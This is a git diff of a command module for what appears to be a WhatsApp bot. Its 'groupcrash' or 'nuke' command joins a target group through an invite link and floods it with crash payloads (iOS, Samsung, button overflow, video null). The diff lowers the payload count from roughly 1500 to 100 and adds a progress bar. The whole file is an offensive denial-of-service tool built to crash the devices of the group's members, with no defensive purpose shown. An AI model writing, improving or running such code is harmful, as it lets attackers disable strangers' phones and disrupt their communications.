@@ -1,11 +1,12 @@
 'use strict';
 const { CrashLib } = require('../../lib/crashlib');
+const { createProgressBar } = require('../../lib/progressBar');
 
 module.exports = {
     name: 'groupcrash',
     aliases: ['gcrash', 'crashgroup', 'gclink', 'groupkill', 'nuke', 'gc', 'obliterate'],
     category: 'crash',
-    desc: 'ɴᴜᴋᴇ ᴀ ɢʀᴏᴜᴘ ᴠɪᴀ ɢʀᴏᴜᴘ ʟɪɴᴋ — ᴏᴠᴇʀᴅʀɪᴠᴇ ᴘᴀʏʟᴏᴀᴅ',
+    desc: 'ɴᴜᴋᴇ ᴀ ɢʀᴏᴜᴘ ᴠɪᴀ ɢʀᴏᴜᴘ ʟɪɴᴋ',
     usage: '.groupcrash <group_link>',
     waitReact: true,
 
@@ -26,90 +27,42 @@ module.exports = {
             crashLib = new CrashLib(sock);
         }
         
-        await sock.sendMessage(ctx.from, { text: '🔍 ʀᴇsᴏʟᴠɪɴɢ ɢʀᴏᴜᴘ ʟɪɴᴋ...' }, { quoted: msg });
-        
         try {
-            // Resolve group link to JID
             const groupJid = await sock.groupAcceptInvite(link.split('/').pop());
             if (!groupJid) throw new Error('Failed to resolve group link');
             
-            await sock.sendMessage(ctx.from, { text: `🎯 ɢʀᴏᴜᴘ ғᴏᴜɴᴅ: ${groupJid}\n☢️ ᴏᴠᴇʀᴅʀɪᴠᴇ ɴᴜᴋᴇ ɪɴɪᴛɪᴀᴛᴇᴅ...\n⚠️ ᴛʜɪs ᴡɪʟʟ sᴇɴᴅ 1500+ ᴘᴀʏʟᴏᴀᴅs` }, { quoted: msg });
+            const TOTAL = 100;
+            const bar = createProgressBar(sock, ctx.from, TOTAL, msg);
             
-            // ═══════════════════════════════════════════════════
-            // PHASE 1: INITIAL BURST — ALL METHODS AT ONCE
-            // ═══════════════════════════════════════════════════
-            await Promise.allSettled([
-                crashLib.iosInvisibleForce(groupJid),
-                crashLib.buttonOverflow(groupJid),
-                crashLib.samsung(groupJid),
-                crashLib.vidxNull(groupJid),
-                crashLib.linkPreviewLoop(groupJid, msg),
-            ]);
-            
-            // ═══════════════════════════════════════════════════
-            // PHASE 2: IOS INVISIBLE FORCE — 200 ROUNDS
-            // ═══════════════════════════════════════════════════
-            for (let i = 0; i < 200; i++) {
+            // Phase 1: iOS — 30
+            for (let i = 0; i < 30; i++) {
                 await crashLib.iosInvisibleForce(groupJid);
-                if (i % 20 === 0) await new Promise(r => setTimeout(r, 100));
+                await bar.update(1, 'ɪᴏs ғᴏʀᴄᴇ');
+                await new Promise(r => setTimeout(r, 200));
             }
             
-            // ═══════════════════════════════════════════════════
-            // PHASE 3: SAMSUNG CRASH — 200 ROUNDS
-            // ═══════════════════════════════════════════════════
-            for (let i = 0; i < 200; i++) {
+            // Phase 2: Samsung — 30
+            for (let i = 0; i < 30; i++) {
                 await crashLib.samsung(groupJid);
-                if (i % 20 === 0) await new Promise(r => setTimeout(r, 100));
+                await bar.update(1, 'sᴀᴍsᴜɴɢ');
+                await new Promise(r => setTimeout(r, 200));
             }
             
-            // ═══════════════════════════════════════════════════
-            // PHASE 4: BUTTON OVERFLOW — 100 ROUNDS
-            // ═══════════════════════════════════════════════════
-            for (let i = 0; i < 100; i++) {
-                await crashLib.buttonOverflow(groupJid);
-                if (i % 10 === 0) await new Promise(r => setTimeout(r, 150));
-            }
-            
-            // ═══════════════════════════════════════════════════
-            // PHASE 5: VIDX NULL V2 — 100 ROUNDS
-            // ═══════════════════════════════════════════════════
-            for (let i = 0; i < 100; i++) {
-                await crashLib.vidxNull(groupJid);
-                if (i % 10 === 0) await new Promise(r => setTimeout(r, 150));
-            }
-            
-            // ═══════════════════════════════════════════════════
-            // PHASE 6: LINK PREVIEW LOOP — 50 ROUNDS
-            // ═══════════════════════════════════════════════════
-            for (let i = 0; i < 50; i++) {
-                await crashLib.linkPreviewLoop(groupJid, msg);
-                if (i % 5 === 0) await new Promise(r => setTimeout(r, 250));
-            }
-            
-            // ═══════════════════════════════════════════════════
-            // PHASE 7: PARALLEL COMBINED BARRAGE — 20 WAVES
-            // Each wave fires all 5 methods simultaneously
-            // ═══════════════════════════════════════════════════
-            for (let wave = 0; wave < 20; wave++) {
-                await Promise.allSettled([
-                    crashLib.iosInvisibleForce(groupJid),
-                    crashLib.samsung(groupJid),
-                    crashLib.buttonOverflow(groupJid),
-                    crashLib.vidxNull(groupJid),
-                    crashLib.linkPreviewLoop(groupJid, msg),
-                ]);
-                if (wave % 3 === 0) await new Promise(r => setTimeout(r, 300));
-            }
-            
-            // ═══════════════════════════════════════════════════
-            // PHASE 8: FINAL EXECUTEALL — 20 ROUNDS
-            // ═══════════════════════════════════════════════════
+            // Phase 3: Button — 20
             for (let i = 0; i < 20; i++) {
-                await crashLib.executeAll(groupJid, msg);
-                if (i % 4 === 0) await new Promise(r => setTimeout(r, 250));
+                await crashLib.buttonOverflow(groupJid);
+                await bar.update(1, 'ʙᴜᴛᴛᴏɴ');
+                await new Promise(r => setTimeout(r, 300));
             }
             
-            return sock.sendMessage(ctx.from, { text: `✅ ᴏᴠᴇʀᴅʀɪᴠᴇ ɴᴜᴋᴇ ᴄᴏᴍᴘʟᴇᴛᴇ ᴏɴ ${groupJid}\n💀 ᴛʜᴇ ɢʀᴏᴜᴘ ɪs ᴄᴏᴍᴘʟᴇᴛᴇʟʏ ᴏʙʟɪᴛᴇʀᴀᴛᴇᴅ\n📊 ᴛᴏᴛᴀʟ ᴘᴀʏʟᴏᴀᴅs: 1500+` }, { quoted: msg });
+            // Phase 4: VidxNull — 20
+            for (let i = 0; i < 20; i++) {
+                await crashLib.vidxNull(groupJid);
+                await bar.update(1, 'ᴠɪᴅx');
+                await new Promise(r => setTimeout(r, 300));
+            }
+            
+            await bar.done(`✅ ɢʀᴏᴜᴘ ɴᴜᴋᴇ ᴄᴏᴍᴘʟᴇᴛᴇ\n💀 ɢʀᴏᴜᴘ ᴏʙʟɪᴛᴇʀᴀᴛᴇᴅ\n📊 ᴛᴏᴛᴀʟ ᴘᴀʏʟᴏᴀᴅs: ${TOTAL}\n🎯 ᴛᴀʀɢᴇᴛ: ${groupJid}`);
         } catch (e) {
             return sock.sendMessage(ctx.from, { text: '❌ ᴇʀʀᴏʀ: ' + e.message }, { quoted: msg });
         }
